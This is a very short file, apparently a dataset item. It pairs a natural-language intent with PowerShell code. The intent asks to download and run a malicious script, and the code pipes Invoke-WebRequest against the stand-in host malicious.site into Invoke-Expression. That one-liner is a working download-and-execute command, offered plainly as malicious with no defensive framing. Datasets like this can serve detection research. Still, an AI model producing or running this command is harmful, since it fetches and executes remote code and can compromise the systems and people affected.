# Natural language intent:
# Invoke PowerShell to download and execute a malicious script from a specified URL using Invoke-WebRequest and Invoke-Expression.

Invoke-Expression -Command "Invoke-WebRequest http://malicious.site/malicious_script.ps1 | Invoke-Expression"
